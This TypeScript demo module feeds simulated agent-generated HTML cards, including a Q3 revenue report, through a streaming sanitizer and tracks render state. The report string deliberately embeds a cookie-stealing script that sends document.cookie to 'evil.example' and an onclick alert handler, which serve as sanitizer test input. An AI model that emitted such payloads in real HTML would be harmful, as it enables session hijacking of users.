import {
  SceneStore,
  StreamCoalescer,
  StreamingIngestion,
  type ArtifactHandle,
} from "@dopejs/deckle";
import type { ArtifactFrame } from "@dopejs/deckle-protocol";
import { StreamingSanitizer } from "@dopejs/deckle-security";

export const DEMO_AGENT_OUTPUT =
  '<section class="report">' +
  "<h2>Q3 revenue</h2>" +
  "<p>Revenue reached <strong>$4.2M</strong>, up 12% quarter over quarter.</p>" +
  "<ul><li>Subscriptions: $3.1M</li><li>Services: $1.1M</li></ul>" +
  '<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>' +
  "<table><tr><th>Segment</th><th>Growth</th></tr>" +
  "<tr><td>Enterprise</td><td>18%</td></tr><tr><td>Self-serve</td><td>7%</td></tr></table>" +
  '<p onclick="alert(1)">Full breakdown in the appendix.</p>' +
  "</section>";

export type StreamingCardKind = "brief" | "report" | "chart" | "notes";

export interface StreamingCardSpec {
  readonly id: string;
  readonly title: string;
  readonly kind: StreamingCardKind;
  readonly hue: number;
  readonly frame: ArtifactFrame;
  readonly source: string;
  readonly announceAtMs: number;
}

export const STREAMING_CARD_SPECS: readonly StreamingCardSpec[] = [
  {
    id: "campaign-brief",
    title: "Campaign brief",
    kind: "brief",
    hue: 44,
    frame: { x: -650, y: -310, width: 270, height: 190, zIndex: 1 },
    source:
      "<article><h2>Campaign brief</h2><p>Audience: growth teams</p>" +
      "<p>Goal: explain Q3 momentum and the next conversion experiments.</p></article>",
    announceAtMs: 0,
  },
  {
    id: "agent-report",
    title: "agent-report.html",
    kind: "report",
    hue: 220,
    frame: { x: -330, y: -225, width: 620, height: 450, zIndex: 5 },
    source: DEMO_AGENT_OUTPUT,
    announceAtMs: 500,
  },
  {
    id: "revenue-chart",
    title: "Revenue chart",
    kind: "chart",
    hue: 148,
    frame: { x: 350, y: -290, width: 330, height: 220, zIndex: 2 },
    source:
      "<section><h2>Revenue by segment</h2><p>Enterprise: 2.4</p>" +
      "<p>Self-serve: 1.1</p><p>Partners: 0.7</p><p>Services: 0.4</p></section>",
    announceAtMs: 1_000,
  },
  {
    id: "appendix-notes",
    title: "Appendix notes",
    kind: "notes",
    hue: 292,
    frame: { x: 390, y: 5, width: 290, height: 205, zIndex: 3 },
    source:
      "<article><h2>Appendix notes</h2><ul><li>Renewals led growth.</li>" +
      "<li>Onboarding lifted conversion.</li><li>Services stayed flat.</li></ul></article>",
    announceAtMs: 1_500,
  },
];

export function tokenizeDemoStream(text: string, seed = 0): string[] {
  const chunks: string[] = [];
  let index = 0;
  let step = 3 + (seed % 3);
  while (index < text.length) {
    chunks.push(text.slice(index, index + step));
    index += step;
    step = (step % 7) + 2;
  }
  return chunks;
}

export interface StreamingCardSession {
  readonly spec: StreamingCardSpec;
  readonly handle: ArtifactHandle;
  readonly sanitizer: StreamingSanitizer;
  readonly ingestion: StreamingIngestion;
  readonly chunks: readonly string[];
  cursor: number;
  html: string;
}

export interface StreamingCanvasSession {
  readonly store: SceneStore;
  readonly cards: StreamingCardSession[];
  clock: number;
  announced: number;
}

export interface StreamingCanvasView {
  readonly announced: number;
  readonly total: number;
  readonly loading: number;
  readonly streaming: number;
  readonly committed: number;
  readonly pinned: number;
  readonly received: number;
  readonly safe: number;
  readonly diagnostics: number;
  readonly draftRevision: number;
  readonly paintRevision: number;
  readonly pending: string;
  readonly complete: boolean;
}

export const EMPTY_STREAMING_CANVAS_VIEW: StreamingCanvasView = {
  announced: 0,
  total: STREAMING_CARD_SPECS.length,
  loading: 0,
  streaming: 0,
  committed: 0,
  pinned: 0,
  received: 0,
  safe: 0,
  diagnostics: 0,
  draftRevision: 0,
  paintRevision: 0,
  pending: "awaiting first card",
  complete: false,
};

export function newStreamingCanvasSession(): StreamingCanvasSession {
  return { store: new SceneStore(), cards: [], clock: 0, announced: 0 };
}

function announceNextCard(session: StreamingCanvasSession): void {
  const spec = STREAMING_CARD_SPECS[session.announced];
  if (spec === undefined) return;
  const handle = session.store.transact((transaction) =>
    transaction.createArtifact(spec.id, spec.frame),
  );
  const sanitizer = new StreamingSanitizer();
  session.cards.push({
    spec,
    handle,
    sanitizer,
    ingestion: new StreamingIngestion(
      session.store,
      handle,
      sanitizer,
      new StreamCoalescer({ minIntervalMs: 40, minChars: 32 }),
    ),
    chunks: tokenizeDemoStream(spec.source, session.announced),
    cursor: 0,
    html: "",
  });
  session.announced += 1;
}

/** Advances card announcements and every open content stream by one deterministic tick. */
export function advanceStreamingCanvasSession(
  session: StreamingCanvasSession,
  elapsedMs: number,
): boolean {
  session.clock += Math.max(1, elapsedMs);
  while (
    session.announced < STREAMING_CARD_SPECS.length &&
    STREAMING_CARD_SPECS[session.announced]!.announceAtMs <= session.clock
  ) {
    announceNextCard(session);
  }

  for (const card of session.cards) {
    if (card.ingestion.settled) continue;
    if (card.cursor >= card.chunks.length) {
      card.html = card.ingestion.finish().html;
      continue;
    }
    const result = card.ingestion.push(card.chunks[card.cursor]!, session.clock);
    card.cursor += 1;
    if (result.rendered) card.html = result.html;
  }

  return !streamingCanvasViewOf(session).complete;
}

export function streamingCanvasViewOf(session: StreamingCanvasSession): StreamingCanvasView {
  let loading = 0;
  let streaming = 0;
  let committed = 0;
  let pinned = 0;
  let received = 0;
  let safe = 0;
  let diagnostics = 0;
  let draftRevision = 0;
  let paintRevision = 0;
  const pending = new Set<string>();

  for (const card of session.cards) {
    const record = session.store.get(card.handle);
    const update = card.sanitizer.current;
    if (record.lifecycle === "loading") loading += 1;
    else if (record.lifecycle === "streaming") streaming += 1;
    else if (record.lifecycle === "parsed") committed += 1;
    if (record.pins.length > 0) pinned += 1;
    received += card.sanitizer.source.length;
    safe += update.safeLength;
    diagnostics += update.diagnostics.length;
    draftRevision += record.revisions.draftRevision;
    paintRevision += record.revisions.paintRevision || record.revisions.provisionalPaintRevision;
    if (update.pending !== null) pending.add(update.pending);
  }

  const complete =
    session.announced === STREAMING_CARD_SPECS.length &&
    session.cards.every((card) => card.ingestion.settled);
  return {
    announced: session.announced,
    total: STREAMING_CARD_SPECS.length,
    loading,
    streaming,
    committed,
    pinned,
    received,
    safe,
    diagnostics,
    draftRevision,
    paintRevision,
    pending:
      pending.size > 0
        ? [...pending].join(", ")
        : session.announced === 0
          ? "awaiting first card"
          : complete
            ? "all streams committed"
            : "safe boundaries decided",
    complete,
  };
}
